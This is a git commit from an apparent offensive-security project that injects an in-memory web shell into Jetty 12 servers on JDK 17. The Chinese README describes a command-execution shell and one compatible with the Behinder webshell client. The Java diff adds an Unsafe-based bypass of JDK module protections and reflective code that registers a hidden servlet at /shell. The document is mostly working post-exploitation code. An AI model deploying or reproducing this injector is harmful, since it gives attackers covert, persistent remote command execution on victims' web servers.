f2c079153489e7065b77c66c7dcaf8cad4b31ac5
Oyst3r1ng <oyst3r@icloud.com>
2025-09-03 19:01:23 +0800

    main

--- README.md
+++ README.md
@@ -1,2 +1,21 @@
 # Jetty-MemoryShell
-Jetty&amp;JDK 均为高版本下的内存马注入
+
+## 介绍
+
+本项目演示了在 JDK 17 与 Jetty 12 等高版本环境下，通过动态注入的方式加载内存马的实现方法（目前仅包含 Servlet 型内存马）。其中：
+
+- TestServlet 类：用于验证运行环境是否正常。
+- cmdServletMemoryShell 类：实现命令执行并回显结果的内存马；
+- BehinderServletMemoryShell 类：可直接对接冰蝎客户端进行管理和上线。
+
+## 使用方式
+
+1. 打包编译。命令行运行 mvn clean package，如下-->
+
+![alt text](images/1.png)
+
+2. 启动 Jetty（插件方式）。接着运行 mvn jetty:run，启动 Jetty 服务器。
+
+3. 注入内存马。访问 /inject 注入冰蝎内存马至 /shell，用客户端连接成功，如下-->
+
+![alt text](images/2.png)
--- src/main/java/com/xxx/cmdServletMemoryShell.java
+++ src/main/java/com/xxx/cmdServletMemoryShell.java
@@ -3,6 +3,7 @@ package com.xxx;
 import jakarta.servlet.http.HttpServlet;
 import jakarta.servlet.http.HttpServletRequest;
 import jakarta.servlet.http.HttpServletResponse;
+import sun.misc.Unsafe;
 import java.io.BufferedReader;
 import java.io.IOException;
 import java.io.InputStreamReader;
@@ -40,6 +41,22 @@ public class cmdServletMemoryShell extends HttpServlet {
 
     protected void doGet(HttpServletRequest req, HttpServletResponse res) {
         try {
+
+            // 0 绕过模块化限制
+            // 0.1 首先获取 Unsafe 实例
+            Class unsafeClass = Class.forName("sun.misc.Unsafe");
+            Field unsafeField = unsafeClass.getDeclaredField("theUnsafe");
+            unsafeField.setAccessible(true);
+            Unsafe unsafe = (Unsafe) unsafeField.get(null);
+            // 0.2 获取 java.base 模块的 Module 引用
+            Module javaBaseModule = Object.class.getModule();
+            // 0.3 计算字段偏移量
+            Field moduleField = Class.class.getDeclaredField("module");
+            long offset = unsafe.objectFieldOffset(moduleField);
+            // 0.4 执行篡改
+            Class<?> clazzBehinderServletMemoryShell = cmdServletMemoryShell.class;
+            unsafe.getAndSetObject(clazzBehinderServletMemoryShell, offset, javaBaseModule);
+
             // 1. 构建 servletHandler
             Thread currentThread = Thread.currentThread();
             Field contextClassLoaderField = Thread.class.getDeclaredField("contextClassLoader");
@@ -53,34 +70,38 @@ public class cmdServletMemoryShell extends HttpServlet {
             Object servletHandler = _servletHandlerField.get(_context);
 
             // 2. 创建 ServletHolder&添加到 ServletHandler
+            // 2.1 使用 Jetty 的 ClassLoader 重新做一遍所需类的加载
             Class<?> clazzServletHandler = servletHandler.getClass();
             ClassLoader jettyClassLoader = clazzServletHandler.getClassLoader();
-            Class<?> clazzServletHolder = jettyClassLoader.loadClass("org.eclipse.jetty.servlet.ServletHolder");
-            Class<?> clazzHolderSource = jettyClassLoader.loadClass("org.eclipse.jetty.servlet.Holder$Source");
-            // 2.1 通过 ServletHandler 的 newServletHolder 方法创建
-            Method newServletHolderMethod = clazzServletHandler.getMethod("newServletHolder", clazzHolderSource);
-            Object holder = newServletHolderMethod.invoke(servletHandler, Enum.valueOf((Class<Enum>) clazzHolderSource, "DESCRIPTOR"));
-            // 2.2 设置 name
+            Class<?> clazzServletHolder = jettyClassLoader.loadClass("org.eclipse.jetty.ee10.servlet.ServletHolder");
+            Class<?> clazzSource = jettyClassLoader.loadClass("org.eclipse.jetty.ee10.servlet.Source");
+            Class<?> clazzOrigin = jettyClassLoader.loadClass("org.eclipse.jetty.ee10.servlet.Source$Origin");
+            // 2.2 通过 ServletHandler 的 newServletHolder 方法创建
+            Object originJakartaApi = Enum.valueOf((Class<Enum>) clazzOrigin, "JAKARTA_API");
+            Object sourceJakartaApi = clazzSource.getConstructor(clazzOrigin).newInstance(originJakartaApi);
+            Method newServletHolderMethod = clazzServletHandler.getMethod("newServletHolder", clazzSource);
+            Object holder = newServletHolderMethod.invoke(servletHandler, sourceJakartaApi);
+            // 2.3 设置 name
             Method setNameMethod = clazzServletHolder.getMethod("setName", String.class);
             setNameMethod.invoke(holder, "ServletMemoryShell");
-            // 2.3 设置 heldClass
+            // 2.4 设置 heldClass
             Method setHeldClassMethod = clazzServletHolder.getMethod("setHeldClass", Class.class);
             setHeldClassMethod.invoke(holder, ServletMemoryShell.class);
-            // 2.4 添加到 ServletHandler
+            // 2.5 添加到 ServletHandler
             Method addServletMethod = clazzServletHandler.getMethod("addServlet", clazzServletHolder);
             addServletMethod.invoke(servletHandler, holder);
 
             // 3. 添加 ServletMapping
-
-            Class<?> clazzServletMapping = jettyClassLoader.loadClass("org.eclipse.jetty.servlet.ServletMapping");
-            Object mapping = clazzServletMapping.getDeclaredConstructor().newInstance();
-            // 3.1 setServletName("InjectServletMemoryShell")
+            // 3.1 使用 Jetty 的 ClassLoader 重新做一遍所需类的加载
+            Class<?> clazzServletMapping = jettyClassLoader.loadClass("org.eclipse.jetty.ee10.servlet.ServletMapping");
+            // 3.2 setServletName("InjectServletMemoryShell")
+            Object mapping = clazzServletMapping.getConstructor(clazzSource).newInstance(sourceJakartaApi);
             Method setServletNameMethod = clazzServletMapping.getMethod("setServletName", String.class);
             setServletNameMethod.invoke(mapping, "ServletMemoryShell");
-            // 3.2 setPathSpecs(new String[]{"/shell"})
+            // 3.3 setPathSpecs(new String[]{"/shell"})
             Method setPathSpecsMethod = clazzServletMapping.getMethod("setPathSpecs", String[].class);
             setPathSpecsMethod.invoke(mapping, (Object) new String[]{"/shell"});
-            // 3.3 加入到 servletHandler
+            // 3.4 加入到 servletHandler
             Method addServletMappingMethod = clazzServletHandler.getMethod("addServletMapping", clazzServletMapping);
             addServletMappingMethod.invoke(servletHandler, mapping);
         }catch (Exception e){
